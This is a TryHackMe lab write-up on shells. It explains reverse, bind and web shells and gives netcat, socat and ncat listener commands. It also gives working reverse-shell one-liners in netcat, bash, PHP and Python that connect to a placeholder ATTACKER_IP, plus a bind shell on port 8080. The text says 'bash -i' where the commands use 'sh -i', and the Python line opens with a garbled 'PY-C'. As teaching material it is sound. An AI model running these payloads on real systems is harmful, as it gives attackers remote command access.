# TryHackMe Writeup: Shell

In cybersecurity, a shell refers to a session that allows attackers to execute commands on a compromised system. This document explores various types of shells, their usage, and examples of payloads.

## Reverse Shell

"A reverse shell, sometimes referred to as a 'connect back shell,' is one of the most popular techniques for gaining access to a system in cyberattacks. The connection initiates from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances."

Using Netcat, start a listener on port 443:

```bash
nc -lvnp 443
```

### About Options
- `-l`: Listen for incoming connections
- `-p`: Specify the port number 
- `-v`: Verbose output to provide more detailed information during execution
- `-n`: The command uses an IP address directly instead of resolving a hostname through DNS

### Example: Pipe Reverse Shell

> Named pipes allow for two-way communication between processes. 

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

#### Explanation of the Payload

- `rm -f /tmp/f`: Removes any existing named pipe file located at `/tmp/f/`.
- `mkfifo /tmp/f`: Creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`.
- `cat /tmp/f`: Reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1`: The output of `cat` is piped to a shell instance (`bash -i`). It allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: This part pipes the shell's output through Netcat to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
- `/tmp/f`: This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

## Bind Shell

"A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely."

### Executed from Target System

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

> Ports below 1024 will require Netcat to be executed with elevated privileges.

#### Explanation of the Payload

- `rm -f /tmp/f`: Removes any existing named pipe file located at `/tmp/f/`.
- `mkfifo /tmp/f`: Creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`.
- `cat /tmp/f`: Reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1`: The output of `cat` is piped to a shell instance (`bash -i`). It allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc -l 0.0.0.0 8080 >/tmp/f`: This Netcat command starts listening on port 8080, waiting for the attacker to connect. The shell will be exposed to the attacker once they connect to this port.
- `/tmp/f`: This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

### Executed from Attacker System

```bash
nc -nv <TARGET_IP> 8080
```

### About Options
- `-n`: The command uses an IP address directly instead of resolving a hostname through DNS
- `-v`: Verbose output to provide more detailed information during execution

## Shell Listeners

### Rlwrap

Add some cool features to Netcat, like history and arrow key navigation:

```bash
rlwrap nc -lnvp 443
```

### NCat

Improved version of Netcat, with extra features like encryption:

```bash
ncat --ssl -lnvp 443
```

### Socat

Allows you to create a socket connection between two data sources:

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

#### Command Options
- `-d`: Provides verbose output. `-d` Again makes more verbose.
- `TCP-LISTEN`: Opens a socket listen with TCP, on port 443
- `STDOUT`: Redirects incoming data to terminal

## Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or sends a connection in the case of a reverse shell.

### Examples

#### Bash

This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (`ATTACKER_IP`) on port 443:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```

#### PHP Reverse Shell Using the exec Function

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

#### Short Python Reverse Shell

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

## Web Shell

"A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers."

"A web shell can be uploaded into the web server by the attacker by exploiting vulnerabilities such as **Unrestricted File Upload**, **File Inclusion**, **Command Injection**, among others."

